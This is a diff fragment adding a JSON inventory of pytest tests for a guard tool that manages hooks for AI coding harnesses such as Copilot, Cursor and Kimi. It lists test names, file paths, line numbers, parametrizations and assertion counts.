+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_claude_hook_argv.py",
+    "name": "test_session_start_rejects_malformed_argv",
+    "line": 150,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('argv', [('guard-home-only',), ('', 'home'), ('guard-home', ''), ('guard-home', 'home', ''), ('guard\\x00home', 'home')])"
+    ],
+    "assertion_count": 0,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_claude_hook_argv.py",
+    "name": "test_shell_command_round_trips_hostile_posix_arguments_without_running_marker",
+    "line": 155,
+    "declared_parametrization": [],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_claude_hook_argv.py",
+    "name": "test_shell_command_round_trips_hostile_windows_arguments_with_crt_reference",
+    "line": 190,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_claude_hook_argv.py",
+    "name": "test_legacy_session_start_command_uses_posix_round_trip",
+    "line": 209,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_claude_hook_argv.py",
+    "name": "test_install_uses_exec_argv_for_every_managed_hook_with_hostile_paths",
+    "line": 227,
+    "declared_parametrization": [],
+    "assertion_count": 8,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_claude_hook_argv.py",
+    "name": "test_global_install_uses_exec_argv_without_workspace",
+    "line": 255,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_claude_hook_argv.py",
+    "name": "test_fallback_argv_preserves_leading_dash_paths_as_option_values",
+    "line": 273,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_claude_hook_argv.py",
+    "name": "test_exec_hook_does_not_run_marker_embedded_in_workspace_path",
+    "line": 287,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_recognizes_bounded_hook_with_python_isolation_flag",
+    "line": 33,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_recognizes_frozen_bounded_hook",
+    "line": 54,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_detects_documented_local_surfaces_and_redacts_secrets",
+    "line": 67,
+    "declared_parametrization": [],
+    "assertion_count": 14,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_detect_tolerates_malformed_json",
+    "line": 146,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_install_recovers_malformed_global_config",
+    "line": 163,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_detect_ignores_hook_json_without_hook_entries",
+    "line": 178,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_detect_records_bash_and_powershell_hook_commands_separately",
+    "line": 194,
+    "declared_parametrization": [],
+    "assertion_count": 6,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_install_and_uninstall_manage_inline_config_hooks_idempotently",
+    "line": 223,
+    "declared_parametrization": [],
+    "assertion_count": 29,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_refresh_guard_proxy_entry_preserves_list_form_proxy_args",
+    "line": 298,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_install_migrates_legacy_workspace_hook_file_out_of_band",
+    "line": 326,
+    "declared_parametrization": [],
+    "assertion_count": 9,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_install_and_uninstall_preserve_existing_inline_hook_content",
+    "line": 355,
+    "declared_parametrization": [],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_install_and_uninstall_parse_jsonc_config_comments",
+    "line": 390,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_install_and_uninstall_match_inline_hooks_after_path_changes",
+    "line": 423,
+    "declared_parametrization": [],
+    "assertion_count": 8,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_uninstall_keeps_workspace_mcp_config_when_backup_metadata_is_unreadable",
+    "line": 488,
+    "declared_parametrization": [],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_uninstall_keeps_backup_when_restore_content_is_missing",
+    "line": 515,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_unsigned_legacy_state_reports_incomplete_without_restoring_untrusted_backup",
+    "line": 541,
+    "declared_parametrization": [],
+    "assertion_count": 6,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_install_manages_workspace_mcp_servers_for_ide",
+    "line": 564,
+    "declared_parametrization": [],
+    "assertion_count": 15,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_install_preserves_existing_workspace_mcp_key_schema",
+    "line": 642,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_install_keeps_target_specific_workspace_servers_distinct",
+    "line": 666,
+    "declared_parametrization": [],
+    "assertion_count": 8,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_install_refreshes_existing_guard_proxy_entries_to_current_interpreter",
+    "line": 710,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_install_refreshes_list_form_guard_proxy_entries_without_losing_args",
+    "line": 768,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_detect_ignores_guard_managed_proxy_entries",
+    "line": 815,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_detect_marks_local_cli_install_as_available_when_not_on_path",
+    "line": 844,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_detect_ignores_non_executable_local_cli_candidate_when_not_on_path",
+    "line": 861,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_launch_command_uses_local_cli_install_when_not_on_path",
+    "line": 878,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_uninstall_restores_install_time_workspace_targets_when_scope_changes",
+    "line": 895,
+    "declared_parametrization": [],
+    "assertion_count": 6,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_uninstall_keeps_shared_cli_hook_while_other_workspace_remains_installed",
+    "line": 939,
+    "declared_parametrization": [],
+    "assertion_count": 7,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_launch_command_adds_workspace_mcp_config_for_cli_sessions",
+    "line": 966,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_copilot_adapter.py",
+    "name": "test_copilot_launch_command_skips_workspace_override_when_cli_mcp_config_is_missing",
+    "line": 984,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_native_qualification_corpus.py",
+    "name": "test_every_frozen_delivered_projection_matches_existing_contract",
+    "line": 98,
+    "declared_parametrization": [],
+    "assertion_count": 0,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_native_qualification_corpus.py",
+    "name": "test_installed_surface_inventory_is_frozen_against_ownership_contract",
+    "line": 103,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_native_qualification_corpus.py",
+    "name": "test_actual_cursor_and_copilot_aliases_are_present",
+    "line": 109,
+    "declared_parametrization": [],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_native_qualification_corpus.py",
+    "name": "test_file_and_mcp_aliases_are_real_actions",
+    "line": 131,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_native_qualification_corpus.py",
+    "name": "test_size_classes_measure_content_and_wire_bytes_separately",
+    "line": 143,
+    "declared_parametrization": [],
+    "assertion_count": 10,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_native_qualification_corpus.py",
+    "name": "test_source_refs_bind_exact_shared_synthetic_content",
+    "line": 162,
+    "declared_parametrization": [],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_native_qualification_corpus.py",
+    "name": "test_non_source_fixture_suffix_cannot_qualify_content_scanning",
+    "line": 180,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_native_qualification_corpus.py",
+    "name": "test_warm_fixture_reuse_does_not_change_source_identity",
+    "line": 190,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_native_qualification_corpus.py",
+    "name": "test_changed_fixture_and_symlink_are_rejected",
+    "line": 199,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_native_qualification_corpus.py",
+    "name": "test_validator_rejects_semantic_changes",
+    "line": 220,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('mutation', ('reason', 'empty', 'false_allow', 'wrong_event', 'numeric_continue', 'unexpected_proof'))"
+    ],
+    "assertion_count": 0,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_native_qualification_corpus.py",
+    "name": "test_validator_requires_post_allow_shape_even_without_reason_code",
+    "line": 239,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_native_qualification_corpus.py",
+    "name": "test_route_and_http_status_are_not_inferred_from_allow",
+    "line": 248,
+    "declared_parametrization": [],
+    "assertion_count": 0,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_native_qualification_corpus.py",
+    "name": "test_watch_native_deny_and_delivered_allow_are_independent",
+    "line": 257,
+    "declared_parametrization": [],
+    "assertion_count": 6,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_native_qualification_corpus.py",
+    "name": "test_unavailable_watch_and_integrity_have_different_results",
+    "line": 284,
+    "declared_parametrization": [],
+    "assertion_count": 7,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_native_qualification_corpus.py",
+    "name": "test_setup_requires_observed_state_not_a_label",
+    "line": 299,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_native_qualification_corpus.py",
+    "name": "test_review_cannot_pass_without_a_resolvable_approval",
+    "line": 312,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_native_qualification_corpus.py",
+    "name": "test_explicit_configuration_and_case_bound",
+    "line": 324,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_native_qualification_corpus.py",
+    "name": "test_cursor_wrapper_observers_do_not_claim_output_enforcement",
+    "line": 338,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_native_qualification_corpus.py",
+    "name": "test_cursor_read_review_uses_deny_while_shell_review_uses_ask",
+    "line": 351,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_native_qualification_corpus.py",
+    "name": "test_cline_post_context_is_observation_even_for_completed_block",
+    "line": 370,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_phase04_harness_contracts.py",
+    "name": "test_gr091_cursor_adapter_detects_workspace_mcp_smoke",
+    "line": 45,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_phase04_harness_contracts.py",
+    "name": "test_gr092_gemini_adapter_detects_cli_settings_smoke",
+    "line": 61,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_phase04_harness_contracts.py",
+    "name": "test_gr093_harness_install_matrix_exposes_statuses_and_coverage",
+    "line": 77,
+    "declared_parametrization": [],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_phase04_harness_contracts.py",
+    "name": "test_gr094_inactive_harness_copy_says_observed_not_protected",
+    "line": 103,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_phase04_harness_contracts.py",
+    "name": "test_gr095_harness_capabilities_table_covers_prompt_tool_shell_mcp_support",
+    "line": 117,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_phase04_harness_contracts.py",
+    "name": "test_gr096_managed_hook_json_matches_each_harness_schema",
+    "line": 127,
+    "declared_parametrization": [],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_phase04_harness_contracts.py",
+    "name": "test_gr099_managed_hooks_use_lightweight_cli_entrypoints",
+    "line": 156,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_phase04_harness_contracts.py",
+    "name": "test_gr100_harness_docs_match_generated_contract_table",
+    "line": 176,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_workspace_source_read_is_emergency_safe",
+    "line": 15,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_env_file_read_is_not_emergency_safe",
+    "line": 24,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_git_status_requires_configuration_proof_for_emergency_safety",
+    "line": 33,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_git_push_is_not_emergency_safe",
+    "line": 38,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_destructive_shell_is_not_emergency_safe",
+    "line": 43,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_mcp_is_not_emergency_safe",
+    "line": 48,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_post_tool_is_not_emergency_safe",
+    "line": 57,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_piped_command_is_not_emergency_safe",
+    "line": 62,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_ordinary_pretool_unavailability_continues_inspection_and_high_impact",
+    "line": 67,
+    "declared_parametrization": [],
+    "assertion_count": 6,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_cursor_fallback_allows_read_and_shell_when_review_cannot_finish",
+    "line": 99,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_hol_guard_status_is_emergency_safe",
+    "line": 114,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_chmod_hook_script_is_not_emergency_safe",
+    "line": 119,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_rg_and_cat_are_emergency_safe",
+    "line": 125,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_find_delete_and_etc_paths_are_not_emergency_safe",
+    "line": 151,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_cline_read_files_is_emergency_safe",
+    "line": 174,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_parent_dir_and_exec_flags_are_not_emergency_safe",
+    "line": 182,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_nested_arguments_path_is_validated",
+    "line": 215,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_filesystem_root_workspace_does_not_fail_open",
+    "line": 225,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_filesystem_root_workspace_rejects_relative_reads",
+    "line": 235,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_tilde_and_home_paths_are_not_emergency_safe",
+    "line": 246,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_tree_output_file_is_not_emergency_safe",
+    "line": 271,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_before_write_file_is_not_emergency_safe",
+    "line": 297,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_missing_workspace_rejects_absolute_paths",
+    "line": 311,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_fd_exec_short_flag_is_not_emergency_safe",
+    "line": 320,
+    "declared_parametrization": [],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_macos_private_prefix_stays_workspace_local",
+    "line": 364,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_availability_continues_prompt_lifecycle_and_still_pauses_tools",
+    "line": 374,
+    "declared_parametrization": [],
+    "assertion_count": 14,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_availability_policy.py",
+    "name": "test_cursor_unparseable_input_allows_read_and_pauses_shell",
+    "line": 481,
+    "declared_parametrization": [],
+    "assertion_count": 10,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_worker_native_post_tool_watch.py",
+    "name": "test_complete_inline_recording_only_output_gets_matching_proof",
+    "line": 15,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_worker_native_post_tool_watch.py",
+    "name": "test_source_ref_proof_is_copied_without_hashing_an_excerpt",
+    "line": 27,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_worker_native_post_tool_watch.py",
+    "name": "test_inherited_excerpt_digest_is_removed_during_allow_original_rewrite",
+    "line": 42,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_worker_native_post_tool_watch.py",
+    "name": "test_inherited_excerpt_digest_is_removed_from_existing_allow_response",
+    "line": 62,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_worker_native_post_tool_watch.py",
+    "name": "test_stale_allow_original_uses_canonical_inline_proof",
+    "line": 84,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_worker_native_post_tool_watch.py",
+    "name": "test_summary_without_digest_falls_back_to_complete_inline_output",
+    "line": 99,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_worker_native_post_tool_watch.py",
+    "name": "test_truncated_or_excerpt_only_output_gets_no_fabricated_proof",
+    "line": 111,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_worker_native_post_tool_watch.py",
+    "name": "test_existing_observe_mode_is_preserved_during_rewrite",
+    "line": 126,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_worker_native_post_tool_watch.py",
+    "name": "test_truncated_inline_output_gets_no_proof",
+    "line": 136,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_worker_observe_pretool.py",
+    "name": "test_hook_worker_watch_native_block_records_without_stopping",
+    "line": 73,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_worker_observe_pretool.py",
+    "name": "test_hook_worker_watch_native_unavailable_continues_without_cli_escape",
+    "line": 125,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_worker_observe_pretool.py",
+    "name": "test_hook_worker_watch_native_unavailable_allows_network",
+    "line": 164,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_worker_observe_pretool.py",
+    "name": "test_hook_worker_enforce_native_unavailable_still_pauses_network",
+    "line": 192,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_worker_observe_pretool.py",
+    "name": "test_hook_worker_watch_native_allow_still_allows",
+    "line": 224,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_worker_observe_pretool.py",
+    "name": "test_hook_worker_watch_posttool_native_unavailable_continues",
+    "line": 257,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_hook_worker_observe_pretool.py",
+    "name": "test_hook_worker_watch_native_off_pretool_continues",
+    "line": 288,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_harness_identifier_is_kimi",
+    "line": 40,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_executable_is_kimi",
+    "line": 43,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_approval_tier_is_approval_center",
+    "line": 46,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_policy_path_uses_workspace_when_provided",
+    "line": 51,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_policy_path_falls_back_to_home_without_workspace",
+    "line": 57,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_empty_dir_returns_no_artifacts",
+    "line": 64,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_empty_config_toml_yields_no_artifacts",
+    "line": 71,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_pretooluse_hook_detected",
+    "line": 80,
+    "declared_parametrization": [],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_user_prompt_submit_hook_detected",
+    "line": 99,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_multiple_hooks_create_indexed_artifacts",
+    "line": 112,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_workspace_config_detected",
+    "line": 130,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_invalid_toml_is_skipped_gracefully",
+    "line": 143,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_mcp_server_in_mcp_json_detected",
+    "line": 151,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_mcp_server_with_url_gets_http_transport",
+    "line": 161,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_install_writes_managed_hooks",
+    "line": 174,
+    "declared_parametrization": [],
+    "assertion_count": 8,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_uninstall_removes_managed_hooks",
+    "line": 188,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_install_preserves_user_hooks",
+    "line": 199,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_install_idempotent",
+    "line": 214,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_managed_block_escapes_quotes_and_backslashes",
+    "line": 225,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_shell_command_uses_posix_quoting_on_unix",
+    "line": 238,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_shell_command_uses_windows_quoting_when_requested",
+    "line": 242,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_windows_hook_command_quotes_metacharacters",
+    "line": 248,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_kimi_block_emits_reason_to_stderr",
+    "line": 267,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_launch_command_passes_workspace",
+    "line": 307,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_kimi_emits_native_hook_response",
+    "line": 315,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_kimi_exit_block_on_blocking_actions",
+    "line": 323,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_kimi_permission_decision_is_deny_for_blocking",
+    "line": 337,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_kimi_adapter.py",
+    "name": "test_normalize_hook_payload_flattens_kimi_content_parts",
+    "line": 347,
+    "declared_parametrization": [],
+    "assertion_count": 1,
